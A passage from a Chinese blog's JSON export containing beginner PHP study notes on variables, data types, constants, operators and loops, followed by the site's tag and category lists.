3、变量名不允许包含空格。当变量名由多个单词组成，建议使用“_”进行分隔（比如 $my_apple），俗称下划线法，或者以大写字母开头比如 $myApple，俗称骆驼式命名法（也称驼峰命名法）。 特别需要注意的是，在PHP中变量名是区分大小写的，如“$my_book”与“$my_Book”代表两个不同的变量。…………………………………………………………………………………………………………………………………………………………………………………………………………9.PHP-什么是变量的数据类型在变量中，由于变量占用的空间单元不一样（占的地盘大小不一样），也分成几种数据类型，就像超市商品的包装袋，有几种不同类型，不同的商品使用不同的包装袋。我们可以通过使用“memory_get_usage”获取当前PHP消耗的内存。……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………10.PHP变量的数据类型在PHP中，支持8种原始类型，其中包括四种标量类型、两种复合类型和两种特殊类型。PHP是一门松散类型的语言，不必向PHP声明变量的数据类型，PHP会自动把变量转换为自动的数据类型，一定程度降低了学习PHP的门槛。如果接触过C语言或者JAVA语言，就会发现在声明变量的时候需要声明变量的数据类型。…………………………………………………………………………………………………………………………………………………………………………………………………………11.PHP标量类型—布尔类型布尔类型（boolean）：只有两个值，一个是TRUE，另一个FALSE，可以理解为是或否。它不区分大小写，也就是说”TRUE”和“true”效果是一样的。主要用在条件结构（条件结构在后面部分会介绍）中，例如判断是否满足条件的时候，是用“true”表示满足，用“false”表示不满足。需要注意的是，当我们用”echo”指令输出布尔类型时，如果是“true”则输出的是“1”，“false”则什么也不输出。我们可以使用“var_dump”函数，获取它真正的数据类型。 1、在第 2 行定义一个字符串，代码为: 1$man = &quot;男&quot;; 2、在第 3 行判断该变量是否等于“男”，并将比较的结果赋值给变量“$flag”，代码为: 1$flag = $man == &quot;男&quot;; 讲解： 1、其中使用“==”等于比较运算符（后续运算符部分会详细介绍）。 2、我们可以发现，虽然使用”echo”指令输出结果为1，而“var_dump”给我们表明了“$flag”为布尔类型的身份。…………………………………………………………………………………………………………………………………………………………………………………………………………12.PHP标量类型—整型整型（integer）：类似于常见的整数。它可以用十进制、八进制、十六进制指定。十进制就是日常使用的数字；八进制，数字前必须加上“0”(这个0是阿拉伯数字0，可不是英文字母“欧”哦)；十六进制，数字前必须加“0x” (这个0也是阿拉伯数字0，不是“欧”哦)。如： ……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………13.PHP标量类型—浮点型浮点型（浮点数、双精度数或实数），也就是通常说的小数，可以用小数点或者科学计数法表示。科学计数法可以使用小写的e，也可以使用大写的E。例如： …………………………………………………………………………………………………………………………………………………………………………………………………………14.#PHP标量类型—字符串（1）字符串是由一系列字符组成，在PHP中，字符和字节一样，也就是说，一共有256种不同字符的可能性。字符串型可以用三种方法定义：单引号形式、双引号形式和Heredoc结构形式。 #PHP标量类型—字符串（2）当你的字符串中包含引号的时候，我们怎么办？第一种方案：在单引号中嵌入双引号，如上图第2行所示；第二种方案：在双引号中嵌入单引号，如上图第3行所示；第三种方案：使用转义符“\\”(后面部分还有介绍)，分别如上图第4行和第5行所示； #PHP标量类型—字符串（3）当引号遇到美元咋办？这里的美元可不是真正的美元，而是用美元符号标识的变量。当双引号中包含变量时，变量会与双引号中的内容连接在一起；当单引号中包含变量时，变量会被当做字符串输出。 #PHP标量类型—字符串（4）当我的字符串很长怎么办？我们可以使用Heredoc结构形式的方法来解决该问题，首先使用定界符表示字符串（&lt;&lt;&lt;），接着在“&lt;&lt;&lt;“之后提供一个标识符GOD，然后是字符串，最后以提供的这个标识符结束字符串。在赋值符号后，输入定界符“&lt;&lt;&lt;”,接着是标识符，你可以用你的女神作为标识符“GOD”，如第2行，也可以使用你喜欢的狗狗，“DOG”作为标识符，但是，结尾处的标识符也必须是一样的。此外，在结尾的一行，如第7行，一定要另起一行，并且此行除了“GOD”，并以“；”号结束之外，不能有任何其他字符，前后都不能有，包括空格，否则会出现错误的哦。切记切记哦。…………………………………………………………………………………………………………………………………………………………………………………………………………15.**#PHP第一种特殊类型—资源资源（resource）：资源是由专门的函数来建立和使用的，例如打开文件、数据连接、图形画布。我们可以对资源进行操作（创建、使用和释放）。任何资源，在不需要的时候应该被及时释放。如果我们忘记了释放资源，系统自动启用垃圾回收机制，在页面执行完毕后回收资源，以避免内存被消耗殆尽。举例如下：**⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐**#PHP第二种特殊类型—空类型NULL（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。 error_reporting(0); //禁止显示PHP警告提示。**⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐**#**⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐…………………………………………………………………………………………………………………………………………………………………………………………………………16.PHP-什么是常量什么是常量？常量可以理解为值不变的量（如圆周率）；或者是常量值被定义后，在脚本的其他任何地方都不可以被改变。PHP中的常量分为自定义常量和系统常量（后续小节会详细介绍）。 自定义常量是根据我们开发的需要，而定义的常量，它通过使用PHP中的函数define()定义。（注：函数，我们可以理解为一个混凝土搅拌机，亦或是一个筛子，通过入口提供原料，然后出口产出结果，在函数中也允许入口不提供任何数据，出口也允许不返回任何值。） define()函数的语法格式为： bool define(string $constant_name, mixed $value[, $case_sensitive = true])它有3个参数（也就是原料）： 第一个参数“constant_name”为必选参数，常量名称,即标志符，常量的命名规则与变量的一致，但是要注意哦，它可不带美元符号哦。第二个参数“value”为必选参数，它是常量的值。第三个参数“case_sensitive”为可选参数，指定是否大小写敏感，设定为true表示不敏感，一般不指定第三个参数的情况下，默认第三个参数的值为false。 （注： string表示参数类型为字符串类型，mixed表示参数类型可以接受为多种不同的类型，case_sensitive = true表示默认为布尔类型TRUE）……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………17.PHP-常量的作用常量有什么用呢？ 常量主要功效是可以避免重复定义，篡改变量值。在我们进行团队开发时，或者代码量很大的时候，对于一些第一次定义后不改变的量，如果我们使用变量，在不知情的情况下，使用同一变量名时，变量值就会被替换掉，从而会引发服务器执行错误的任务。 此外，使用常量还能提高代码的可维护性。如果由于某些原因，常量的值需要变更时候，我们只需要修改一个地方。例如在做计算中，起初我们取圆周率为3.14，于是很多计算中我们都使用3.14进行计算，当要求计算精度提高，圆周率需要取3.142的时候，我们不得不修改所有使用3.14的代码，倘若代码量比较多时，不仅工作量大，还可能遗漏。…………………………………………………………………………………………………………………………………………………………………………………………………………………………18.PHP-认识一下系统常量系统常量是PHP已经定义好的常量，我们可以直接拿来使用，常见的系统常量有： （1）FILE :php程序文件名。它可以帮助我们获取当前文件在服务器的物理位置。 （2）LINE :PHP程序文件行数。它可以告诉我们，当前代码在第几行。 （3）PHP_VERSION:当前解析器的版本号。它可以告诉我们当前PHP解析器的版本号，我们可以提前知道我们的PHP代码是否可被该PHP解析器解析。 （4）PHP_OS：执行当前PHP版本的操作系统名称。它可以告诉我们服务器所用的操作系统名称，我们可以根据该操作系统优化我们的代码。………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………19.PHP-常量如何取值定义了常量，那么就要使用常量，那么如何获取常量值呢？ 获取常量值的有两种方法取值。第一种是使用常量名直接获取值；例如计算圆周率的面积，如下（“*”是运算符，相当于乘号，后面部分的小节会介绍）： 第二种是使用constant()函数。它和直接使用常量名输出的效果是一样的，但函数可以动态的输出不同的常量，在使用上要灵活、方便，其语法格式如下： mixed constant(string constant_name)第一个参数constant_name为要获取常量的名称，也可为存储常量名的变量。如果成功则返回常量的值，失败则提示错误信息常量没有被定义。（注：mixed表示函数返回值类型为多种不同的类型，string表示参数类型为字符串类型）…………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………20.PHP-如何判定常量是否被定义如果常量被重复定义以后，PHP解析器会发出“Constant XXX already defined”的警告，提醒我们该常量已经被定义过。那么，在团队开发，或代码量很大的情况下，我们如何去判定一个常量是否被定义呢？ defined()函数可以帮助我们判断一个常量是否已经定义，其语法格式为： bool defined(string constants_name)它只有参数constant_name，指的是要获取常量的名称，若存在则返回布尔类型true，否则返回布尔类型false; （注：bool表示函数返回值类型为布尔类型）……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………21.PHP中的赋值运算符PHP的赋值运算符有两种，分别是： (1)“=”：把右边表达式的值赋给左边的运算数。它将右边表达式值复制一份，交给左边的运算数。换而言之，首先给左边的运算数申请了一块内存，然后把复制的值放到这个内存中。 (2)“&amp;”：引用赋值，意味着两个变量都指向同一个数据。它将使两个变量共享一块内存，如果这个内存存储的数据变了，那么两个变量的值都会发生变化。………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………22.比较运算符主要是用于进行比较运算的，例如：等于、全等、不等、大于、小于。在PHP中常用的比较运算符如下表：…………………………………………………………………………………………………………………………………………………………………………………………………………………………23.PHP中的三元运算符(“?:”)三元运算符也是一个比较运算符，对于表达式(expr1)?(expr2):(expr3)，如果expr1的值为true，则此表达式的值为expr2，否则为expr3。……………………………………………………………………………………………………………………………………………………………………………………………………………………………………24.逻辑运算符主用是进行逻辑运算的，例如：逻辑与、逻辑或、逻辑异或、逻辑非等，在PHP中常用的逻辑运算符如下表： 我们可以从投票的角度来理解逻辑运算： 1、逻辑与：要求所有人都投票同意，才会通过某协议； 2、逻辑或：只要求一个人投票同意就行； 3、逻辑异或：只能有且只能有一个人投票同意；⭐ 4、逻辑非：某个人要反对，但是通过逻辑非，使其反对无效； “与”和“或”有两种不同形式运算符的原因是它们运算的优先级（就是运算的有限顺序，比如我们小学的时候学习四则运算，加减乘除混合在一起啦，优先计算乘除，再计算加减）不同。………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………25.PHP中的字符串连接运算符字符串连接运算符是为了将两个字符串进行连接，PHP中提供的字符串连接运算符有： （1）连接运算符(“.”)：它返回将右参数附加到左参数后面所得的字符串。 （2）连接赋值运算符(“.=”)：它将右边参数附加到左边的参数后。 任务两种连接运算符区别在哪呢？ 在右边编辑器中输入三条指令， 1、在第3行输入第一条指令“$tip = $a.”,欢迎您在慕课网学习PHP！”;” 2、在第6行输入第二条指令“$b .= “,道是无晴却有晴”;” 3、在第9行输入第三条指令“$c = $c.”,道是无晴却有晴”;” 我们可以看出连接赋值运算符在连接字符串的基础上，还有赋值功能。此外，第6行的指令与第9行的指令效果相同，但前者代码更简洁。……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………26.#PHP中的错误控制运算符（1）PHP中提供了一个错误控制运算符“@”，对于一些可能会在运行过程中出错的表达式时，我们不希望出错的时候给客户显示错误信息，这样对用户不友好。于是，可以将@放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被忽略掉；如果激活了track_error（这个玩意在php.ini中设置）特性，表达式所产生的任何错误信息都被存放在变量$php_errormsg中，此变量在每次出错时都会被覆盖，所以如果想用它的话必须尽早检查。需要注意的是：错误控制前缀“@”不会屏蔽解析错误的信息，不能把它放在函数或类的定义之前，也不能用于条件结构例如if和foreach等。 #PHP中的算术运算符（2）取模算术符有啥用呢？假设我们要在一个考场安排了一场考试，对考生从1开始，都进行了编号，那么怎么让服务器帮助我们计算考生在的位置呢，进而打印考场的考生对照表呢？在右边编辑器里输入两条指令，如图所示：…………………………………………………………………………………………………………………………………………………………………………………………………………27. PHP-顺序结构顺序结构就像一条直线，按着顺序一直往下执行。我们编写的代码默认都是按照顺序结构执行的。………………………………………………………………………………………………………………………………………………………………………………28.PHP条件结构之switch…case…PHP中的“switch…case…”语法，如下： 首先判断条件，若条件的返回值为条件值一，则执行任务一，若条件返回的值为条件值二，则执行任务二，若条件的返回值既不是条件值一也不是条件值二，则执行默认任务。break的作用是结束switch（后面会有专门举例说明），使用 switch 语句可以避免冗长的 “if..else if..else”代码块。………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………29.#PHP中循环结构之foreach循环语句(任务一)在PHP中foreach循环语句，常用于遍历数组，一般有两种使用方式:不取下标、取下标。（1）只取值，不取下标（2）同时取下标和值 值){ //执行的任务 } ?> #&lt;?php$students = array(‘2010’=&gt;’令狐冲’,‘2011’=&gt;’林平之’,‘2012’=&gt;’曲洋’,‘2013’=&gt;’任盈盈’,‘2014’=&gt;’向问天’,‘2015’=&gt;’任我行’,‘2016’=&gt;’冲虚’,‘2017’=&gt;’方正’,‘2018’=&gt;’岳不群’,‘2019’=&gt;’宁中则’,);//10个学生的学号和姓名，用数组存储 //使用循环结构遍历数组,获取学号和姓名foreach($students as $key =&gt;$v){ echo $key.”:”.$v;//输出（打印）学号：姓名 echo ““;}?&gt; ……………………………………………………………………………………………………………………………………………………………………………………………………………………………………………………30.","link":"/2020/11/28/PHP%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"php变量覆盖","slug":"php变量覆盖","link":"/tags/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"Buuctf PHP代码审计 文件包含","slug":"Buuctf-PHP代码审计-文件包含","link":"/tags/Buuctf-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"Buuctf","slug":"Buuctf","link":"/tags/Buuctf/"},{"name":"Html和css","slug":"Html和css","link":"/tags/Html%E5%92%8Ccss/"},{"name":"Buuctf SQL","slug":"Buuctf-SQL","link":"/tags/Buuctf-SQL/"},{"name":"buuctf","slug":"buuctf","link":"/tags/buuctf/"},{"name":"伪协议","slug":"伪协议","link":"/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE/"}],"categories":[{"name":"WEB","slug":"WEB","link":"/categories/WEB/"},{"name":"LeetCode","slug":"LeetCode","link":"/categories/LeetCode/"},{"name":"学习报告","slug":"学习报告","link":"/categories/%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"},{"name":"笔记","slug":"笔记","link":"/categories/%E7%AC%94%E8%AE%B0/"},{"name":"web","slug":"web","link":"/categories/web/"}]}